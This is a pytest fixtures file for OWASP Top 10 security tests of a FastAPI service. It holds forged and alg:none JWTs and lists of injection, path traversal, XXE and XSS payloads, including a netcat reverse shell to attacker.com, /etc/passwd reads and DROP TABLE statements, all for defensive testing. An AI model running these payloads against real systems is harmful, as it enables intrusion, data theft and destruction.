"""
Security Tests Fixtures and Configuration

Provides pytest configuration and shared fixtures for OWASP Top 10
security testing scenarios.

STORY-055: Security Testing
Sprint: Sprint 04
Author: QA Agent
"""

import os
import secrets
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List

import jwt
import pytest
from fastapi.testclient import TestClient

# Project root path setup
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root / "src"))

from app.core.config import settings
from app.main import app


# =============================================================================
# Pytest Configuration - Custom Markers
# =============================================================================


def pytest_configure(config):
    """Register custom pytest markers for security tests."""
    markers = [
        "security: Security-related tests",
        "owasp_a01: A01 - Broken Access Control",
        "owasp_a02: A02 - Cryptographic Failures",
        "owasp_a03: A03 - Injection",
        "owasp_a07: A07 - Cross-Site Scripting (XSS)",
        "p0: Priority 0 (Critical) tests",
        "p1: Priority 1 (High) tests",
        "p2: Priority 2 (Medium) tests",
    ]
    for marker in markers:
        config.addinivalue_line("markers", marker)


# =============================================================================
# JWT Constants
# =============================================================================

# Matches the JWT secret in auth.py (test environment)
JWT_SECRET_KEY = "knowledge-service-secret-key-change-in-production"
JWT_ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30


# =============================================================================
# Core Fixtures
# =============================================================================


@pytest.fixture(scope="module")
def client() -> TestClient:
    """Synchronous test client."""
    return TestClient(app)


@pytest.fixture(scope="session")
def api_prefix() -> str:
    """API version prefix from settings."""
    return settings.api_v1_prefix


# =============================================================================
# Token Generation Fixtures
# =============================================================================


@pytest.fixture
def valid_user_token() -> str:
    """Generate a valid JWT access token for a regular user."""
    payload = {
        "sub": "user-001",
        "email": "test@example.com",
        "role": "user",
        "exp": datetime.utcnow() + timedelta(minutes=30),
        "iat": datetime.utcnow(),
        "type": "access",
    }
    return jwt.encode(payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)


@pytest.fixture
def valid_admin_token() -> str:
    """Generate a valid JWT access token for an admin user."""
    payload = {
        "sub": "user-002",
        "email": "admin@example.com",
        "role": "admin",
        "exp": datetime.utcnow() + timedelta(minutes=30),
        "iat": datetime.utcnow(),
        "type": "access",
    }
    return jwt.encode(payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)


@pytest.fixture
def expired_token() -> str:
    """Generate an expired JWT access token."""
    payload = {
        "sub": "user-001",
        "email": "test@example.com",
        "role": "user",
        "exp": datetime.utcnow() - timedelta(hours=1),
        "iat": datetime.utcnow() - timedelta(hours=2),
        "type": "access",
    }
    return jwt.encode(payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)


@pytest.fixture
def tampered_token() -> str:
    """Generate a JWT token signed with a different secret (tampered)."""
    payload = {
        "sub": "user-999",
        "email": "hacker@evil.com",
        "role": "admin",  # Attempted privilege escalation
        "exp": datetime.utcnow() + timedelta(minutes=30),
        "iat": datetime.utcnow(),
        "type": "access",
    }
    return jwt.encode(payload, "wrong-secret-key", algorithm=JWT_ALGORITHM)


@pytest.fixture
def none_algorithm_token() -> str:
    """Generate a JWT token with 'none' algorithm (alg:none attack)."""
    # Manually construct a token with alg:none
    # Header: {"alg": "none", "typ": "JWT"}
    # Payload: {"sub": "admin", ...}
    import base64
    import json

    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()

    payload_data = {
        "sub": "user-999",
        "email": "hacker@evil.com",
        "role": "admin",
        "exp": (datetime.utcnow() + timedelta(minutes=30)).timestamp(),
        "type": "access",
    }
    payload = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()
    ).rstrip(b"=").decode()

    # No signature for alg:none
    return f"{header}.{payload}."


@pytest.fixture
def malformed_tokens() -> List[str]:
    """Collection of malformed JWT tokens for testing."""
    return [
        "",  # Empty token
        "not-a-jwt",  # Plain string
        "a.b",  # Only two parts
        "a.b.c.d",  # Too many parts
        "eyJhbGciOiJIUzI1NiJ9..",  # Empty payload
        "eyJhbGciOiJIUzI1NiJ9.e30.",  # Empty signature
        "eyJhbGciOiJIUzI1NiJ9.!!!invalid!!!.sig",  # Invalid base64 payload
    ]


@pytest.fixture
def auth_headers(valid_user_token: str) -> Dict[str, str]:
    """Authorization headers with valid Bearer token."""
    return {"Authorization": f"Bearer {valid_user_token}"}


@pytest.fixture
def admin_auth_headers(valid_admin_token: str) -> Dict[str, str]:
    """Authorization headers with admin Bearer token."""
    return {"Authorization": f"Bearer {valid_admin_token}"}


# =============================================================================
# OWASP A01: Broken Access Control - Payload Fixtures
# =============================================================================


@pytest.fixture
def horizontal_privilege_escalation_payloads() -> List[Dict[str, Any]]:
    """Payloads for testing horizontal privilege escalation."""
    return [
        {"user_id": "user-002", "action": "view_profile"},
        {"user_id": "../user-002", "action": "view_profile"},
        {"user_id": "user-001/../user-002", "action": "view_profile"},
    ]


@pytest.fixture
def vertical_privilege_escalation_payloads() -> List[Dict[str, Any]]:
    """Payloads for testing vertical privilege escalation."""
    return [
        {"role": "admin"},
        {"role": "superuser"},
        {"is_admin": True},
        {"permissions": ["admin", "write", "delete"]},
    ]


@pytest.fixture
def path_traversal_payloads() -> List[str]:
    """Collection of path traversal attack payloads."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.txt",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
    ]


# =============================================================================
# OWASP A02: Cryptographic Failures - Payload Fixtures
# =============================================================================


@pytest.fixture
def weak_passwords() -> List[str]:
    """Collection of weak passwords that should be rejected."""
    return [
        "password",
        "123456",
        "qwerty",
        "abc123",
        "letmein",
        "111111",
        "admin123",
        "welcome",
        "monkey",
        "dragon",
    ]


@pytest.fixture
def sensitive_data_patterns() -> List[str]:
    """Regex patterns for detecting sensitive data leakage."""
    return [
        r"password",
        r"secret",
        r"api[_-]?key",
        r"private[_-]?key",
        r"access[_-]?token",
        r"credit[_-]?card",
        r"ssn",
        r"social[_-]?security",
        r"jwt[_-]?secret",
        r"database[_-]?password",
    ]


# =============================================================================
# OWASP A03: Injection - Payload Fixtures
# =============================================================================


@pytest.fixture
def sql_injection_payloads() -> List[str]:
    """Collection of SQL injection attack payloads."""
    return [
        # Basic SQL injection
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "' UNION SELECT * FROM information_schema.tables --",
        "1; DELETE FROM documents WHERE 1=1",
        "' OR 1=1; --",
        "admin'--",
        # Time-based blind SQL injection
        "1' AND SLEEP(5) --",
        "1'; WAITFOR DELAY '0:0:5' --",
        # Error-based SQL injection
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
        # Stacked queries
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    ]


@pytest.fixture
def nosql_injection_payloads() -> List[Dict[str, Any]]:
    """Collection of NoSQL injection attack payloads."""
    return [
        {"$gt": ""},
        {"$ne": None},
        {"$where": "this.password.length > 0"},
        {"$regex": ".*"},
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
    ]


@pytest.fixture
def ldap_injection_payloads() -> List[str]:
    """Collection of LDAP injection attack payloads."""
    return [
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "*)((|password=*",
        "*)(objectClass=*",
    ]


@pytest.fixture
def command_injection_payloads() -> List[str]:
    """Collection of OS command injection attack payloads."""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(cat /etc/passwd)",
        "|| ping -c 10 127.0.0.1",
        "; sleep 10",
        "| nc -e /bin/sh attacker.com 4444",
    ]


@pytest.fixture
def xml_injection_payloads() -> List[str]:
    """Collection of XXE (XML External Entity) attack payloads."""
    return [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
    ]


# =============================================================================
# OWASP A07: XSS - Payload Fixtures
# =============================================================================


@pytest.fixture
def xss_payloads() -> List[str]:
    """Collection of XSS attack payloads."""
    return [
        # Basic script injection
        "<script>alert('xss')</script>",
        "<SCRIPT>alert('xss')</SCRIPT>",
        "<ScRiPt>alert('xss')</ScRiPt>",
        # Event handler injection
        '<img onerror="alert(1)" src=x>',
        '<img src=x onerror="alert(1)">',
        '<div onmouseover="alert(1)">hover</div>',
        '<body onload="alert(1)">',
        # SVG-based XSS
        '<svg onload="alert(1)">test</svg>',
        '<svg><script>alert(1)</script></svg>',
        # JavaScript URI
        '<a href="javascript:alert(1)">click</a>',
        "javascript:alert(document.cookie)",
        # Data URI
        '<a href="data:text/html,<script>alert(1)</script>">click</a>',
        # Encoded payloads
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        '"><script>alert(document.cookie)</script>',
        "'-alert(1)-'",
        # HTML5 vectors
        "<video><source onerror=\"alert(1)\">",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        # Template injection
        "${alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",
    ]


@pytest.fixture
def xss_filter_evasion_payloads() -> List[str]:
    """Collection of XSS filter evasion payloads."""
    return [
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        # Null bytes
        "<scr\x00ipt>alert(1)</script>",
        # Unicode encoding
        "<script>\\u0061lert(1)</script>",
        # HTML entities
        "<script>&#97;lert(1)</script>",
        # Double encoding
        "%253Cscript%253Ealert(1)%253C/script%253E",
        # Newlines and tabs
        "<script\n>alert(1)</script>",
        "<script\t>alert(1)</script>",
        # Incomplete tags
        "<script>alert(1)//",
        "<script>alert(1)<!--",
        # Obfuscated
        "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
    ]


# =============================================================================
# Request Validation Payloads
# =============================================================================


@pytest.fixture
def boundary_test_queries() -> Dict[str, str]:
    """Queries for testing input length boundaries."""
    return {
        "empty": "",
        "min_valid": "a",
        "normal": "What is RAG?",
        "max_valid": "A" * 1000,  # Exactly 1000 chars (max allowed)
        "exceeds_max": "A" * 1001,  # 1001 chars (should be rejected)
        "very_long": "A" * 10000,  # Way over limit
    }


@pytest.fixture
def special_character_queries() -> List[str]:
    """Queries with special characters for validation testing."""
    return [
        "test with 'single quotes'",
        'test with "double quotes"',
        "test with <angle> brackets",
        "test with & ampersand",
        "test with \\ backslash",
        "test with / forward slash",
        "test with \n newline",
        "test with \t tab",
        "test with \r carriage return",
        "test with \x00 null byte",
        "test with unicode: \u00e9\u00e8\u00ea",
    ]
